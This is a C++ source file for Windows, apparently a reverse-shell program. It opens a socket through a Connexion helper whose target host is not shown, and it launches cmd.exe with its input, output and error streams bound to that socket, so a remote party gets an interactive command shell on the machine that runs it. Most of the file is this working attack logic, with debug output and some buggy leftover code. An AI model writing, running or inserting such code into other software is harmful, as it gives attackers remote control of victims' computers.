#include "../inc/Exec.h"
#include "../inc/Connexion.h"

#include <iostream> 
#include <windows.h>
#include <string>
#include <winsock2.h> 


using namespace std;

int main()
{
    Connexion conn;

    conn.openConnexion();
    int sock = conn.getSocket();
    cout << "SOCK: " << sock << endl;

    STARTUPINFOW siStartInfo;
    PROCESS_INFORMATION piProcInfo;
    
    ZeroMemory(&siStartInfo, sizeof(siStartInfo)); //Remplit un bloc de mémoire avec des zéros.
    ZeroMemory(&piProcInfo, sizeof(piProcInfo));

    siStartInfo.cb = sizeof(siStartInfo);

    siStartInfo.dwFlags = STARTF_USESTDHANDLES; //| STARTF_USESHOWWINDOW) ; //for hStdInput, hStdOutput, hStdError

    siStartInfo.hStdInput= (HANDLE)sock;
    siStartInfo.hStdOutput=  (HANDLE)sock;
    siStartInfo.hStdError= (HANDLE)sock;
    
    
   // siStartInfo.wShowWindow = SW_HIDE;

    //GetStartupInfoA(&siStartInfo);
    wchar_t cmd[] = L"C:\\windows\\system32\\cmd.exe";
    //send(socktest, "juan",5,0);
    CreateProcessW(NULL,  //command line 
        cmd,     // argv of cmd
        NULL,          // process security attributes 
        NULL,          // primary thread security attributes 
        TRUE,          // handles are inherited 
        0,             // creation flags 
        NULL,          // use parent's environment 
        NULL,          // use parent's current directory 
        &siStartInfo,  // STARTUPINFO pointer 
        &piProcInfo);  // receives PROCESS_INFORMATION
    
  
    BOOL status = WaitForSingleObject(piProcInfo.hProcess, INFINITE);


    cout << "STATUS: " << status << endl;
    cout << "CREATE PROC: " << status << endl;

    CloseHandle(piProcInfo.hProcess);
    CloseHandle(piProcInfo.hThread);
    //Exec().spawnCMD(sock);

    char buff[4096];
    int len_recv = recv(sock, buff, strlen(buff), 0);
    cout << "RECV" <<buff<< endl;
    while(true)
    {
        cout <<"tempo " << endl;
        string tmp;
        cin >> tmp;
        
    }
    return 0;
}